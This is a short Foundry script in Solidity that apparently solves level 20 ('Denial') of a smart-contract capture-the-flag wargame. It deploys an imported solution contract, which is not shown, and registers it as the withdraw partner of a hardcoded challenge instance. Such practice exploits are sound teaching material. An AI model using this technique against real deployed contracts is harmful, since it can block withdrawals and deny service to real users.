// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Script.sol";
import { IDenial } from "src/20_Denial/IDenial.sol";
import { DenialSolution } from "src/20_Denial/DenialSolution.sol";

contract DenialScript is Script {

    IDenial denial;
    DenialSolution denialSolution;
    address instanceAddress = 0x5040577d8c0DE9Ce8a8a7886e45cb1221E05A082;


    function setUp() public {
        denial = IDenial(instanceAddress);
    }

    function run() public {
        vm.startBroadcast();

        denialSolution = new DenialSolution(denial);
        denial.setWithdrawPartner(address(denialSolution));

        vm.stopBroadcast();
    }
}
